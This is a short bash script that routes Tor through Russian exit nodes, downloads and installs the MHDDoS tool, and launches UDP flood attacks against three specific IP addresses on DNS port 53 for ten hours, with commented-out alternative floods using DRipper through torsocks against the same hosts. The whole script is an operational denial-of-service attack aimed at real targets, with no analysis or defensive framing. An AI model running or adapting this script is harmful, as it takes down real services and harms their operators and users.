#!/bin/bash

echo "ExitNodes {ru}">> /etc/tor/torrc
echo "StrictNodes 1" >> /etc/tor/torrc
service tor restart

git clone https://github.com/MHProDev/MHDDoS.git
cd MHDDoS
pip3 install -r requirements.txt

python3 start.py udp 217.175.155.100:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log &
python3 start.py udp 217.175.155.12:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log &
python3 start.py udp 217.175.140.71:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log &

sleep 10;

#torsocks -P 9050 python3 DRipper.py -s 217.175.155.100 -p 53 -t 135 -m udp
#torsocks -P 9050 python3 DRipper.py -s 217.175.155.12 -p 53 -t 135 -m udp
#torsocks -P 9050 python3 DRipper.py -s 217.175.140.71 -p 53 -t 135 -m udp
